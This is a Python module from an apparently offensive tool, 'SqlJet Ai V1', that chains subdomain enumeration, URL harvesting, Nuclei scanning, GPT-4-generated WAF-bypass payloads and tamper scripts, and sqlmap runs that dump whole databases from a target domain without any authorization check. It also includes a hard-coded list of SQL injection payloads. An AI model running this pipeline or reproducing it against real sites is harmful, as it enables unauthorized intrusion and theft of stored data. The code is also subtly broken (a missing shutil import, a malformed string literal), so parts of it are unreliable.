#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# SqlJet Ai V1 - Integrated Workflow Module
# Copyright (c) 2024-2025 SqlJet Ai developers by R13
#
# This module handles the full integrated workflow for end-to-end SQL injection testing
# It automates all steps in sequence as specified

import os
import sys
import time
import json
import subprocess
import requests
from datetime import datetime
from colorama import Fore, Style
import re
import random
import logging
import openai
from atlas_integrator import find_best_tampers, sqlmap_with_tampers

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("sqljet_integrated_workflow")

class IntegratedWorkflow:
    """
    Handles the full integrated workflow for SQL injection testing
    Runs all steps in sequence automatically:
    1. Subdomain enumeration with subfinder
    2. Live host verification with httpx
    3. URL discovery with waybackurls
    4. URL discovery with gau
    5. Parameter-URL crawling with katana
    6. AI-powered SQL injection detection with nuclei
    7. Payload generation with OpenAI or from payload folders
    8. WAF identification with identywaf
    9. WAF bypass with Atlas or custom OpenAI-generated tampers
    10. Database extraction with sqlmap
    """
    
    def __init__(self, domain, output_dir, tool_paths, verify_ssl=True, 
                 openai_key=None, pdcp_api_key=None, verbose=False, 
                 sqli_level=3, risk_level=2):
        """
        Initialize the integrated workflow handler

        Args:
            domain (str): Target domain to scan
            output_dir (str): Directory to store results
            tool_paths (dict): Dictionary of paths to required tools
            verify_ssl (bool): Whether to verify SSL certificates
            openai_key (str): OpenAI API key
            pdcp_api_key (str): ProjectDiscovery API key for Nuclei
            verbose (bool): Enable verbose output
            sqli_level (int): SQL injection detection level (1-5)
            risk_level (int): Risk level for testing (1-3)
        """
        self.domain = domain
        self.output_dir = output_dir
        self.tool_paths = tool_paths
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.sqli_level = sqli_level
        self.risk_level = risk_level
        
        # Configure OpenAI integration
        if openai_key:
            openai.api_key = openai_key
            self.openai_enabled = True
        else:
            self.openai_enabled = False
            
        # Store PDCP API key for Nuclei
        self.pdcp_api_key = pdcp_api_key
        
        # Results storage
        self.subdomains = []
        self.live_hosts = []
        self.parameter_urls = []
        self.injectable_urls = []
        self.waf_info = {}
        self.sqli_results = {}
        
        # Create output directories
        os.makedirs(os.path.join(output_dir, "subdomains"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "urls"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "injectable"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "payloads"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "waf"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "sqlmap"), exist_ok=True)
        
        # Log initialization
        self.log_success(f"Integrated workflow initialized for {domain}")
        self.log_info(f"Results will be saved to {output_dir}")
        
    def log_info(self, message):
        """Log an informational message."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {Fore.BLUE}[INFO] {message}{Style.RESET_ALL}")
        
    def log_success(self, message):
        """Log a success message."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {Fore.GREEN}[SUCCESS] {message}{Style.RESET_ALL}")
    
    def log_warning(self, message):
        """Log a warning message."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {Fore.YELLOW}[WARNING] {message}{Style.RESET_ALL}")
    
    def log_error(self, message):
        """Log an error message."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {Fore.RED}[ERROR] {message}{Style.RESET_ALL}")
        
    def run_command(self, command, env=None):
        """
        Run a shell command and return output
        
        Args:
            command (list): Command and arguments to run
            env (dict): Environment variables
            
        Returns:
            tuple: (return_code, stdout, stderr)
        """
        if self.verbose:
            self.log_info(f"Running command: {' '.join(command)}")
            
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                universal_newlines=True
            )
            stdout, stderr = process.communicate()
            return process.returncode, stdout, stderr
        except Exception as e:
            self.log_error(f"Error running command: {e}")
            return -1, "", str(e)
            
    def step1_enumerate_subdomains(self):
        """
        Step 1: Enumerate subdomains using subfinder
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info(f"STEP 1: Enumerating subdomains for {self.domain}")
        
        subfinder_path = self.tool_paths.get("subfinder")
        if not subfinder_path:
            self.log_error("subfinder not found")
            return False
            
        output_file = os.path.join(self.output_dir, "subdomains", "subfinder_results.txt")
        
        cmd = [subfinder_path, "-d", self.domain, "-o", output_file]
        returncode, stdout, stderr = self.run_command(cmd)
        
        if returncode != 0:
            self.log_error(f"Subfinder failed: {stderr}")
            return False
            
        # Read and store subdomains
        if os.path.exists(output_file):
            with open(output_file, "r") as f:
                self.subdomains = [line.strip() for line in f if line.strip()]
                
            self.log_success(f"Found {len(self.subdomains)} subdomains")
            return True
        else:
            self.log_error("Subfinder did not produce output file")
            return False
            
    def step2_verify_live_hosts(self):
        """
        Step 2: Verify live hosts using httpx
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 2: Verifying live hosts with httpx")
        
        if not self.subdomains:
            self.log_warning("No subdomains to check. Using main domain only.")
            self.subdomains = [self.domain]
            
        httpx_path = self.tool_paths.get("httpx")
        if not httpx_path:
            self.log_error("httpx not found")
            return False
            
        # Create temporary file with all subdomains
        temp_subdomain_file = os.path.join(self.output_dir, "subdomains", "all_domains.txt")
        with open(temp_subdomain_file, "w") as f:
            f.write("\n".join(self.subdomains))
            
        output_file = os.path.join(self.output_dir, "subdomains", "live_hosts.txt")
        
        cmd = [
            httpx_path,
            "-l", temp_subdomain_file,
            "-o", output_file,
            "-status-code",
            "-title",
            "-silent"
        ]
        
        if not self.verify_ssl:
            cmd.append("-insecure")
            
        returncode, stdout, stderr = self.run_command(cmd)
        
        if returncode != 0:
            self.log_error(f"httpx failed: {stderr}")
            return False
            
        # Read and store live hosts
        if os.path.exists(output_file):
            with open(output_file, "r") as f:
                self.live_hosts = [line.strip().split(" ")[0] for line in f if line.strip()]
                
            self.log_success(f"Found {len(self.live_hosts)} live hosts")
            return True
        else:
            self.log_error("httpx did not produce output file")
            return False
            
    def step3_discover_urls_waybackurls(self):
        """
        Step 3: Discover URLs using waybackurls
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 3: Discovering URLs with waybackurls")
        
        if not self.live_hosts:
            self.log_warning("No live hosts to check. Using main domain only.")
            self.live_hosts = [self.domain]
            
        waybackurls_path = self.tool_paths.get("waybackurls")
        if not waybackurls_path:
            self.log_error("waybackurls not found")
            return False
            
        all_urls = set()
        
        for host in self.live_hosts:
            output_file = os.path.join(self.output_dir, "urls", f"{host}_waybackurls.txt")
            
            # Create a temporary file with the host
            temp_host_file = os.path.join(self.output_dir, "urls", f"{host}_temp.txt")
            with open(temp_host_file, "w") as f:
                f.write(host)
                
            cmd = ["cat", temp_host_file, "|", waybackurls_path, ">", output_file]
            cmd_str = " ".join(cmd)
            process = subprocess.run(cmd_str, shell=True, stderr=subprocess.PIPE, universal_newlines=True)
            
            if process.returncode != 0:
                self.log_error(f"waybackurls failed for {host}: {process.stderr}")
                continue
                
            # Read URLs
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    host_urls = [line.strip() for line in f if line.strip()]
                    all_urls.update(host_urls)
                    self.log_info(f"Found {len(host_urls)} URLs for {host} with waybackurls")
                    
            # Clean up temporary file
            if os.path.exists(temp_host_file):
                os.remove(temp_host_file)
                
        # Store unique URLs with parameters
        self.waybackurls_results = list(all_urls)
        parameter_urls = [url for url in all_urls if "?" in url]
        self.parameter_urls.extend(parameter_urls)
        
        self.log_success(f"Found {len(all_urls)} total URLs and {len(parameter_urls)} with parameters using waybackurls")
        return True
        
    def step4_discover_urls_gau(self):
        """
        Step 4: Discover URLs using gau
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 4: Discovering URLs with gau")
        
        if not self.live_hosts:
            self.log_warning("No live hosts to check. Using main domain only.")
            self.live_hosts = [self.domain]
            
        gau_path = self.tool_paths.get("gau")
        if not gau_path:
            self.log_error("gau not found")
            return False
            
        all_urls = set()
        
        for host in self.live_hosts:
            output_file = os.path.join(self.output_dir, "urls", f"{host}_gau.txt")
            
            # Create a temporary file with the host
            temp_host_file = os.path.join(self.output_dir, "urls", f"{host}_temp.txt")
            with open(temp_host_file, "w") as f:
                f.write(host)
                
            cmd = ["cat", temp_host_file, "|", gau_path, "--threads", "10", ">", output_file]
            cmd_str = " ".join(cmd)
            process = subprocess.run(cmd_str, shell=True, stderr=subprocess.PIPE, universal_newlines=True)
            
            if process.returncode != 0:
                self.log_error(f"gau failed for {host}: {process.stderr}")
                continue
                
            # Read URLs
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    host_urls = [line.strip() for line in f if line.strip()]
                    all_urls.update(host_urls)
                    self.log_info(f"Found {len(host_urls)} URLs for {host} with gau")
                    
            # Clean up temporary file
            if os.path.exists(temp_host_file):
                os.remove(temp_host_file)
                
        # Store unique URLs with parameters
        self.gau_results = list(all_urls)
        parameter_urls = [url for url in all_urls if "?" in url]
        self.parameter_urls.extend(parameter_urls)
        
        # Remove duplicates
        self.parameter_urls = list(set(self.parameter_urls))
        
        self.log_success(f"Found {len(all_urls)} total URLs and {len(parameter_urls)} with parameters using gau")
        self.log_success(f"Total unique parameter URLs discovered so far: {len(self.parameter_urls)}")
        return True
        
    def step5_crawl_with_katana(self):
        """
        Step 5: Crawl websites using katana to find more parameter URLs
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 5: Crawling websites with katana")
        
        if not self.live_hosts:
            self.log_warning("No live hosts to check. Using main domain only.")
            self.live_hosts = [self.domain]
            
        katana_path = self.tool_paths.get("katana")
        if not katana_path:
            self.log_error("katana not found")
            return False
            
        all_urls = set()
        
        for host in self.live_hosts:
            output_file = os.path.join(self.output_dir, "urls", f"{host}_katana.txt")
            
            cmd = [
                katana_path,
                "-u", host,
                "-o", output_file,
                "-jc",
                "-field-scope", "all",
                "-crawl-duration", "60",
                "-js-crawl"
            ]
            
            if not self.verify_ssl:
                cmd.extend(["-insecure"])
                
            returncode, stdout, stderr = self.run_command(cmd)
            
            if returncode != 0:
                self.log_error(f"katana failed for {host}: {stderr}")
                continue
                
            # Read URLs
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    host_urls = [line.strip() for line in f if line.strip()]
                    all_urls.update(host_urls)
                    self.log_info(f"Found {len(host_urls)} URLs for {host} with katana")
            
        # Store unique URLs with parameters
        self.katana_results = list(all_urls)
        parameter_urls = [url for url in all_urls if "?" in url]
        self.parameter_urls.extend(parameter_urls)
        
        # Remove duplicates
        self.parameter_urls = list(set(self.parameter_urls))
        
        self.log_success(f"Found {len(all_urls)} total URLs and {len(parameter_urls)} with parameters using katana")
        self.log_success(f"Total unique parameter URLs discovered so far: {len(self.parameter_urls)}")
        
        # Save all parameter URLs to a file for nuclei and SQLMap scanning
        parameter_urls_file = os.path.join(self.output_dir, "urls", "parameter_urls.txt")
        with open(parameter_urls_file, "w") as f:
            f.write("\n".join(self.parameter_urls))
            
        return True
        
    def step6_nuclei_ai_scan(self):
        """
        Step 6: Run Nuclei with AI prompts to detect SQL injection vulnerabilities
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 6: Running Nuclei with AI prompts for SQL injection detection")
        
        nuclei_path = self.tool_paths.get("nuclei")
        if not nuclei_path:
            self.log_error("nuclei not found")
            return False
            
        if not self.parameter_urls:
            self.log_warning("No parameter URLs found for scanning")
            return False
            
        # Set environment variables for Nuclei
        env = os.environ.copy()
        if self.pdcp_api_key:
            env["PDCP_API_KEY"] = self.pdcp_api_key
            
        # Prepare parameter URLs file
        parameter_urls_file = os.path.join(self.output_dir, "urls", "parameter_urls.txt")
        if not os.path.exists(parameter_urls_file):
            with open(parameter_urls_file, "w") as f:
                f.write("\n".join(self.parameter_urls))
                
        # SQL injection detection prompts
        prompts = [
            "Identify SQL injection vulnerabilities using boolean-based conditions.",
            "Detect SQL injection vulnerabilities where UNION statements can be leveraged to extract data.",
            "Check for error messages revealing SQL queries.",
            "Use time-based techniques to find blind SQL injection.",
            "Detect SQL injection vulnerabilities using time delay techniques.",
            "Scan for time based SQL injection in all parameters",
            "Fuzz all parameters with sql injection detection payloads for mysql, mssql, postgresql, etc. Use time base detection payloads",
            "Find SQL injection in 'id', 'user', 'product', 'category', 'page' parameters",
            "Scan for blind SQL injection in 's', 'search', 'query', 'sort', 'filter' GET/POST parameters",
            "Identify second-order SQL injection vulnerabilities where input is stored and executed later.",
            "Identify SQL injection in API endpoints using JSON payloads",
            "Check for SQL injection via HTTP headers (User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host)"
        ]
        
        vulnerable_urls = set()
        
        # Run each prompt against all parameter URLs
        for i, prompt in enumerate(prompts, 1):
            output_file = os.path.join(self.output_dir, "injectable", f"nuclei_sqli_{i}.json")
            
            self.log_info(f"Running SQL injection scan {i}/{len(prompts)}: {prompt}")
            
            cmd = [
                nuclei_path,
                "-l", parameter_urls_file,
                "-ai", prompt,
                "-o", output_file,
                "-j",  # JSON output
                "-v",  # Verbose
                "-rate-limit", "150",
                "-timeout", "20"  # Increase timeout for time-based detection
            ]
            
            if not self.verify_ssl:
                cmd.append("-insecure")
                
            returncode, stdout, stderr = self.run_command(cmd, env)
            
            # Check if any vulnerabilities were found by parsing the JSON output
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                try:
                    with open(output_file, "r") as f:
                        for line in f:
                            try:
                                result = json.loads(line)
                                if "matched-at" in result:
                                    vulnerable_url = result["matched-at"]
                                    vulnerable_urls.add(vulnerable_url)
                                    self.log_success(f"Found SQL injection vulnerability in {vulnerable_url}")
                            except json.JSONDecodeError:
                                continue
                except Exception as e:
                    self.log_error(f"Error parsing Nuclei output: {e}")
            
        # Store injectable URLs
        self.injectable_urls = list(vulnerable_urls)
        
        # Save injectable URLs to a file for SQLMap scanning
        if self.injectable_urls:
            injectable_urls_file = os.path.join(self.output_dir, "injectable", "nuclei_vulnerable_urls.txt")
            with open(injectable_urls_file, "w") as f:
                f.write("\n".join(self.injectable_urls))
                
            self.log_success(f"Found {len(self.injectable_urls)} potentially injectable URLs with Nuclei")
            return True
        else:
            self.log_warning("No SQL injection vulnerabilities found with Nuclei")
            return True  # Continue with the workflow even if no vulnerabilities found
            
    def step7_generate_payloads(self):
        """
        Step 7: Generate SQL injection payloads using OpenAI or from payload folders
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 7: Generating SQL injection payloads")
        
        # If no injectable URLs were found by Nuclei, use all parameter URLs
        target_urls = self.injectable_urls if self.injectable_urls else self.parameter_urls
        
        if not target_urls:
            self.log_warning("No URLs found for payload generation")
            return False
            
        payload_dir = os.path.join(self.output_dir, "payloads")
        os.makedirs(payload_dir, exist_ok=True)
        
        # First check if we have payload files in the SqlQ/Payloads directory
        sqlq_payloads_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "Payloads")
        payload_files_found = False
        
        if os.path.exists(sqlq_payloads_dir):
            for root, _, files in os.walk(sqlq_payloads_dir):
                for file in files:
                    if file.endswith(".txt") and "SQLi" in file:
                        src_file = os.path.join(root, file)
                        dst_file = os.path.join(payload_dir, file)
                        shutil.copy(src_file, dst_file)
                        self.log_info(f"Copied payload file: {file}")
                        payload_files_found = True
        
        # If we have OpenAI enabled, generate custom payloads for each URL parameter
        if self.openai_enabled:
            self.log_info("Generating custom SQL injection payloads with OpenAI")
            custom_payloads = {}
            
            for url in target_urls[:10]:  # Limit to 10 URLs to avoid excessive API calls
                try:
                    params = re.findall(r'[?&]([^=]+)=', url)
                    for param in params:
                        if param not in custom_payloads:
                            prompt = f"""Generate 10 advanced SQL injection payloads specific for the parameter '{param}' in the URL '{url}'.
                            Focus on techniques that might bypass WAF protection and work for MySQL, PostgreSQL and MSSQL.
                            Return only the raw payloads, one per line, without any explanation."""
                            
                            response = openai.ChatCompletion.create(
                                model="gpt-4",
                                messages=[
                                    {"role": "system", "content": "You are a specialized security expert focusing on SQL injection payloads."},
                                    {"role": "user", "content": prompt}
                                ],
                                temperature=0.7
                            )
                            
                            payloads = response.choices[0].message.content.strip().split('\n')
                            custom_payloads[param] = payloads
                            
                            # Save to file
                            with open(os.path.join(payload_dir, f"custom_payloads_{param}.txt"), "w") as f:
                                f.write('\n'.join(payloads))
                                
                            self.log_success(f"Generated {len(payloads)} custom payloads for parameter '{param}'")
                except Exception as e:
                    self.log_error(f"Error generating custom payloads: {e}")
            
            # If neither files found nor OpenAI generated, create some basic payloads
            if not payload_files_found and not custom_payloads:
                self.log_warning("No payload files found and OpenAI generation failed. Creating basic payloads.")
                basic_payloads = [
                    "'", "\"'", "1' OR '1'='1", "1\" OR \"1\"=\"1",
                    "' OR 1=1 --", "\" OR 1=1 --", "' OR '1'='1' --",
                    "admin' --", "admin' #", "' UNION SELECT 1,2,3 --",
                    "' AND (SELECT 1 FROM (SELECT SLEEP(5))A) --",
                    "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,table_name,8 FROM information_schema.tables WHERE table_schema=database() --"
                ]
                
                with open(os.path.join(payload_dir, "basic_payloads.txt"), "w") as f:
                    f.write('\n'.join(basic_payloads))
            
        return True
        
    def step8_identify_waf(self):
        """
        Step 8: Identify WAF using identywaf or manual detection
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 8: Identifying WAF protection")
        
        # For now we'll implement a simplified WAF detection
        # This would ideally use wafw00f or other tools, but we'll use a basic approach
        
        target_urls = self.injectable_urls if self.injectable_urls else self.parameter_urls[:5]
        
        if not target_urls:
            self.log_warning("No URLs found for WAF identification")
            return False
            
        waf_signatures = {
            "Cloudflare": ["cloudflare", "ray id", "cf-ray"],
            "AWS WAF": ["aws-waf", "aws"],
            "Akamai": ["akamai"],
            "Imperva": ["imperva", "incapsula"],
            "F5 BIG-IP": ["big-ip", "f5"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Sucuri": ["sucuri"],
            "Wordfence": ["wordfence"]
        }
        
        waf_findings = {}
        
        for url in target_urls:
            try:
                # Send a request with a simple SQL injection payload
                test_url = url.replace("=", "=' OR '1'='1' --") if "=" in url else url
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SqlQ Security Scanner"}
                response = requests.get(test_url, headers=headers, verify=self.verify_ssl, timeout=10)
                
                # Check response headers and body for WAF signatures
                headers_str = str(response.headers).lower()
                body = response.text.lower()
                
                # Look for WAF signatures
                detected_wafs = []
                for waf, signatures in waf_signatures.items():
                    if any(sig in headers_str or sig in body for sig in signatures):
                        detected_wafs.append(waf)
                        
                # Check for WAF behavior (403, 406, 429, 503 status codes)
                if response.status_code in [403, 406, 429, 503]:
                    if "waf" in body or "firewall" in body or "security" in body:
                        detected_wafs.append("Generic WAF (based on response)")
                        
                if detected_wafs:
                    waf_findings[url] = detected_wafs
                    self.log_success(f"Detected WAF for {url}: {', '.join(detected_wafs)}")
                    
            except Exception as e:
                self.log_error(f"Error testing WAF for {url}: {e}")
        
        # Store WAF findings
        self.waf_info = waf_findings
        
        # If WAF detection enabled and OpenAI available, generate a report
        if self.openai_enabled and waf_findings:
            try:
                waf_summary = \"""
                WAF Detection Results:
                \n\n"""
                for url, wafs in waf_findings.items():
                    waf_summary += f"URL: {url}\nDetected WAFs: {', '.join(wafs)}\n\n"
                
                # Get recommendations from OpenAI
                prompt = f"""Based on the following WAF detection results, provide recommendations for bypassing these WAFs for SQL injection testing:\n\n{waf_summary}\n\nProvide specific techniques and example payloads for each detected WAF."""
                
                response = openai.ChatCompletion.create(
                    model="gpt-4",
                    messages=[
                        {"role": "system", "content": "You are a specialized security expert focusing on WAF bypass techniques."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.7
                )
                
                recommendations = response.choices[0].message.content
                
                # Save to file
                with open(os.path.join(self.output_dir, "waf", "waf_report.txt"), "w") as f:
                    f.write(waf_summary + "\n\nBypass Recommendations:\n\n" + recommendations)
                    
                self.log_success("Generated WAF bypass recommendations with OpenAI")
                
            except Exception as e:
                self.log_error(f"Error generating WAF recommendations: {e}")
        
        # Save WAF findings to a file
        with open(os.path.join(self.output_dir, "waf", "waf_findings.json"), "w") as f:
            json.dump(waf_findings, f, indent=4)
        
        return True
        
    def step9_find_waf_bypass(self):
        """
        Step 9: Find appropriate tamper techniques to bypass WAF
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 9: Finding WAF bypass techniques")
        
        waf_bypass_file = os.path.join(self.output_dir, "waf", "tamper_techniques.txt")
        
        # If WAF was detected, use Atlas to find tamper techniques
        if self.waf_info:
            detected_wafs = set()
            for url, wafs in self.waf_info.items():
                detected_wafs.update(wafs)
                
            self.log_info(f"Finding tamper techniques for detected WAFs: {', '.join(detected_wafs)}")
            
            # Use atlas_integrator to find best tampers
            try:
                tampers = find_best_tampers(list(detected_wafs))
                
                with open(waf_bypass_file, "w") as f:
                    f.write("# Tamper techniques for detected WAFs\n")
                    f.write(f"# {', '.join(detected_wafs)}\n\n")
                    f.write("\n".join(tampers))
                    
                self.tamper_techniques = tampers
                self.log_success(f"Found {len(tampers)} tamper techniques for detected WAFs")
                
            except Exception as e:
                self.log_error(f"Error finding tamper techniques: {e}")
                
        # If OpenAI is enabled, generate custom tamper scripts
        if self.openai_enabled:
            try:
                prompt = f"""Create a custom SQLMap tamper script to bypass the following WAFs: {', '.join(detected_wafs) if self.waf_info else 'Generic WAFs'}.
                This script should modify SQL injection payloads to evade detection.
                Provide the complete Python code for a SQLMap tamper script.
                Make sure to include the necessary imports and the tamper function with documentation."""
                
                response = openai.ChatCompletion.create(
                    model="gpt-4",
                    messages=[
                        {"role": "system", "content": "You are a specialized security expert focusing on creating tamper scripts to bypass WAFs."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.7
                )
                
                tamper_script = response.choices[0].message.content
                tamper_script_file = os.path.join(self.output_dir, "waf", "custom_tamper.py")
                
                with open(tamper_script_file, "w") as f:
                    f.write(tamper_script)
                    
                self.log_success("Generated custom tamper script with OpenAI")
                
            except Exception as e:
                self.log_error(f"Error generating custom tamper script: {e}")
        
        return True
        
    def step10_sqlmap_exploitation(self):
        """
        Step 10: Run SQLMap to exploit detected injection points
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STEP 10: Running SQLMap for exploitation")
        
        sqlmap_path = self.tool_paths.get("sqlmap")
        if not sqlmap_path:
            self.log_error("sqlmap not found")
            return False
            
        # If Nuclei found vulnerable URLs, use those, otherwise use all parameter URLs
        target_file = None
        if self.injectable_urls:
            target_file = os.path.join(self.output_dir, "injectable", "nuclei_vulnerable_urls.txt")
            self.log_info(f"Using {len(self.injectable_urls)} Nuclei-detected vulnerable URLs for SQLMap")
        else:
            target_file = os.path.join(self.output_dir, "urls", "parameter_urls.txt")
            self.log_info(f"Using {len(self.parameter_urls)} parameter URLs for SQLMap")
            
        if not os.path.exists(target_file) or os.path.getsize(target_file) == 0:
            self.log_error(f"Target file {target_file} not found or empty")
            return False
            
        # Determine tamper scripts to use
        tamper_scripts = []
        if hasattr(self, 'tamper_techniques') and self.tamper_techniques:
            tamper_scripts = self.tamper_techniques
        
        # Check if we generated a custom tamper script
        custom_tamper = os.path.join(self.output_dir, "waf", "custom_tamper.py")
        if os.path.exists(custom_tamper):
            tamper_scripts.append(custom_tamper)
            
        # Build SQLMap command
        cmd = [
            sqlmap_path,
            "-m", target_file,  # Multiple targets from file
            "--batch",  # Non-interactive mode
            "--answers=Y",  # Answer yes to all questions
            "--level", str(self.sqli_level),
            "--risk", str(self.risk_level),
            "--threads", "10",
            "--timeout", "30",
            "--output-dir", os.path.join(self.output_dir, "sqlmap")
        ]
        
        # Add tamper scripts if available
        if tamper_scripts:
            cmd.extend(["--tamper", ",".join(tamper_scripts)])
            
        # Add database enumeration options
        cmd.extend(["--dbs", "--tables", "--dump"])
        
        self.log_info(f"Running SQLMap command: {' '.join(cmd)}")
        returncode, stdout, stderr = self.run_command(cmd)
        
        # Save SQLMap output
        with open(os.path.join(self.output_dir, "sqlmap", "sqlmap_output.txt"), "w") as f:
            f.write(stdout)
        
        if returncode != 0:
            self.log_error(f"SQLMap failed: {stderr}")
            return False
            
        self.log_success("SQLMap scan completed successfully")
        return True
        
    def run_full_workflow(self):
        """
        Run the full end-to-end workflow
        
        Returns:
            bool: True if successful, False otherwise
        """
        self.log_info("STARTING FULL INTEGRATED WORKFLOW")
        
        # Create an overall summary file
        summary_file = os.path.join(self.output_dir, "workflow_summary.txt")
        with open(summary_file, "w") as f:
            f.write(f"SqlJet Ai V1 Comprehensive Scan Summary for {self.domain}\n")
            f.write("="* 60 + "\n")
            f.write(f"Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Dictionary to track steps and their status
        workflow_steps = {
            "1. Subdomain Enumeration": self.step1_enumerate_subdomains,
            "2. Live Host Verification": self.step2_verify_live_hosts,
            "3. URL Discovery (waybackurls)": self.step3_discover_urls_waybackurls,
            "4. URL Discovery (gau)": self.step4_discover_urls_gau,
            "5. Parameter URL Crawling": self.step5_crawl_with_katana,
            "6. Nuclei AI-Powered Scanning": self.step6_nuclei_ai_scan,
            "7. Payload Generation": self.step7_generate_payloads,
            "8. WAF Identification": self.step8_identify_waf,
            "9. WAF Bypass Techniques": self.step9_find_waf_bypass,
            "10. SQLMap Exploitation": self.step10_sqlmap_exploitation
        }
        
        results = {}
        start_time = time.time()
        
        # Run each step and record result
        for step_name, step_func in workflow_steps.items():
            step_start = time.time()
            self.log_info(f"Running {step_name}")
            
            try:
                success = step_func()
                duration = time.time() - step_start
                results[step_name] = {
                    "success": success,
                    "duration": duration,
                    "time": f"{duration:.2f} seconds"
                }
                
                self.log_info(f"Completed {step_name} in {duration:.2f} seconds")
                
            except Exception as e:
                self.log_error(f"Error in {step_name}: {e}")
                results[step_name] = {
                    "success": False,
                    "error": str(e),
                    "duration": time.time() - step_start,
                    "time": f"{(time.time() - step_start):.2f} seconds"
                }
        
        # Calculate total duration
        total_duration = time.time() - start_time
        
        # Update summary file with results
        with open(summary_file, "a") as f:
            f.write(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total scan duration: {total_duration/60:.2f} minutes\n\n")
            
            f.write("WORKFLOW RESULTS:\n")
            for step_name, result in results.items():
                status = "✓ Success" if result.get("success") else "✗ Failed"
                f.write(f"{step_name}: {status} ({result.get('time')})\n")
                if "error" in result:
                    f.write(f"  Error: {result['error']}\n")
            
            f.write("\nSUMMARY OF FINDINGS:\n")
            f.write(f"- Subdomains discovered: {len(self.subdomains)}\n")
            f.write(f"- Live hosts: {len(self.live_hosts)}\n")
            f.write(f"- Parameter URLs found: {len(self.parameter_urls)}\n")
            f.write(f"- Potential SQL injection points: {len(self.injectable_urls)}\n")
            f.write(f"- WAFs detected: {len(self.waf_info)}\n")
            
            # Add SQLMap findings if available
            sqlmap_results_dir = os.path.join(self.output_dir, "sqlmap")
            if os.path.exists(sqlmap_results_dir):
                f.write("\nSQLMap results available in: " + sqlmap_results_dir + "\n")
        
        self.log_success(f"Full workflow completed in {total_duration/60:.2f} minutes")
        self.log_success(f"Results saved to {self.output_dir}")
        
        return True
